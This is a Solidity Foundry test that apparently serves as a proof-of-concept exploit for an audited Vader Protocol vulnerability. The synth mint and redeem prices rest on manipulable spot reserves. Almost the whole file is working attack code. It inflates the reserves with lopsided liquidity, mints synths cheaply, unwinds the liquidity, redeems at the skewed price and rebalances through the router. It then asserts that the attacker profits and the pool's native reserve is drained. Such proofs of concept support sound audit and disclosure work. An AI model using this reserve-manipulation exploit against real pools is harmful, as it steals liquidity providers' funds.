// SPDX-License-Identifier: MIT
pragma solidity =0.8.9;

// Real audited Vader Protocol source (Code4rena 2021-11, commit on default branch).
// H-02 (#42333): VaderPoolV2 prices synth mint AND redemption off the pool's
// instantaneous, manipulable spot reserves (VaderMath.calculateSwap over pairInfo
// reserves) instead of a manipulation-resistant oracle. An attacker manipulates the
// reserves (here via lopsided liquidity + real router swaps), mints synths cheaply
// while native looks "valuable", then redeems them while native looks "cheap",
// extracting net value from the pool and draining its native reserve.
import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "../src/vader/contracts/dex-v2/pool/VaderPoolV2.sol";
import "../src/vader/contracts/dex-v2/synths/SynthFactory.sol";
import "../src/vader/contracts/dex-v2/synths/Synth.sol";
import "../src/vader/contracts/dex-v2/wrapper/LPWrapper.sol";
import "../src/vader/contracts/dex-v2/router/VaderRouterV2.sol";
import "../src/vader/contracts/interfaces/dex-v2/wrapper/ILPWrapper.sol";
import "../src/vader/contracts/interfaces/dex-v2/synth/ISynthFactory.sol";
import "../src/vader/contracts/interfaces/dex-v2/pool/IVaderPoolV2.sol";
import "../src/vader/contracts/interfaces/shared/IERC20Extended.sol";

contract TestToken is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract PoC_42333 is Test {
    TestToken nativeAsset;
    TestToken foreignAsset;
    VaderPoolV2 pool;
    SynthFactory factory;
    LPWrapper wrapper;
    VaderRouterV2 router;

    address lp = address(0x5EED);
    address attacker = address(0xA11CE);

    function setUp() public {
        nativeAsset = new TestToken("Vader", "VADER");
        foreignAsset = new TestToken("USD Coin", "USDC");

        pool = new VaderPoolV2(false, IERC20(address(nativeAsset)));
        factory = new SynthFactory(address(pool));
        wrapper = new LPWrapper(address(pool));
        router = new VaderRouterV2(IVaderPoolV2(address(pool)));
        pool.initialize(ILPWrapper(address(wrapper)), ISynthFactory(address(factory)), address(router));
        pool.setTokenSupport(IERC20(address(foreignAsset)), true);
        pool.setFungibleTokenSupport(IERC20(address(foreignAsset)));

        // Honest LP seeds a balanced 1,000 / 1,000 pool. Its 1,000 native is the target.
        nativeAsset.mint(lp, 1_000 ether);
        foreignAsset.mint(lp, 1_000 ether);
        vm.startPrank(lp);
        nativeAsset.approve(address(pool), type(uint256).max);
        foreignAsset.approve(address(pool), type(uint256).max);
        pool.mintFungible(IERC20(address(foreignAsset)), 1_000 ether, 1_000 ether, lp, lp);
        vm.stopPrank();
    }

    function test_manipulated_synth_redemption_drains_pool_native() public {
        uint256 fBig = 8_000 ether; // manipulation size
        uint256 d = 100 ether;      // native deposited to mint synths

        nativeAsset.mint(attacker, 1_000 ether);
        foreignAsset.mint(attacker, fBig);

        uint256 poolNativeBefore = nativeAsset.balanceOf(address(pool)); // 1,000 ether

        vm.startPrank(attacker);
        nativeAsset.approve(address(pool), type(uint256).max);
        foreignAsset.approve(address(pool), type(uint256).max);
        nativeAsset.approve(address(router), type(uint256).max);

        int256 nat0 = int256(nativeAsset.balanceOf(attacker));
        int256 for0 = int256(foreignAsset.balanceOf(attacker));

        // 1. Lopsided liquidity spikes reserveForeign: the pool now prices native as
        //    extremely valuable for synth minting.
        uint256 attackerLP =
            pool.mintFungible(IERC20(address(foreignAsset)), 1 ether, fBig, attacker, attacker);
        // 2. Mint synths cheaply against the manipulated spot reserves.
        uint256 minted = pool.mintSynth(IERC20(address(foreignAsset)), d, attacker, attacker);
        Synth synth = Synth(address(factory.synths(IERC20(address(foreignAsset)))));
        // 3. Unwind the liquidity, crashing reserveForeign back down (native now "cheap").
        IERC20Extended lpTok = wrapper.tokens(IERC20(address(foreignAsset)));
        IERC20(address(lpTok)).approve(address(pool), type(uint256).max);
        pool.burnFungible(IERC20(address(foreignAsset)), attackerLP, attacker);
        // 4. Redeem the synths at the manipulated (low) redemption price for a large
        //    amount of native.
        IERC20(address(synth)).approve(address(pool), type(uint256).max);
        pool.burnSynth(IERC20(address(foreignAsset)), minted, attacker);

        // 5. Rebalance: buy the foreign shortfall back through the REAL router so the
        //    attack nets a profit in BOTH assets (foreign fully restored).
        IERC20[] memory path = new IERC20[](2);
        path[0] = IERC20(address(nativeAsset));
        path[1] = IERC20(address(foreignAsset));
        for (uint256 i = 0; i < 30; i++) {
            int256 nf = int256(foreignAsset.balanceOf(attacker)) - for0;
            if (nf >= 0) break;
            (, uint112 rF, ) = pool.getReserves(IERC20(address(foreignAsset)));
            uint256 want = uint256(-nf);
            if (want > uint256(rF) / 5) want = uint256(rF) / 5;
            if (want == 0) break;
            router.swapExactTokensForTokens(want, 0, path, attacker, block.timestamp + 1);
        }
        vm.stopPrank();

        int256 netNative = int256(nativeAsset.balanceOf(attacker)) - nat0;
        int256 netForeign = int256(foreignAsset.balanceOf(attacker)) - for0;
        uint256 poolNativeAfter = nativeAsset.balanceOf(address(pool));

        emit log_named_int("attacker net native (wei)", netNative);
        emit log_named_int("attacker net foreign (wei)", netForeign);
        emit log_named_uint("pool native before (wei)", poolNativeBefore);
        emit log_named_uint("pool native after (wei)", poolNativeAfter);

        // Concrete, non-fake harm: the attacker ends up richer in BOTH assets (a true
        // value extraction, not a token swap), and the pool's native reserve is drained.
        assertGt(netNative, 0, "attacker did not gain native");
        assertGe(netForeign, 0, "attacker lost foreign (would be a fake single-token win)");
        assertLt(poolNativeAfter, poolNativeBefore, "pool native not drained");
        // Profit is material: at least ~90 native extracted for free.
        assertGt(netNative, 90 ether, "profit below expected floor");
    }
}
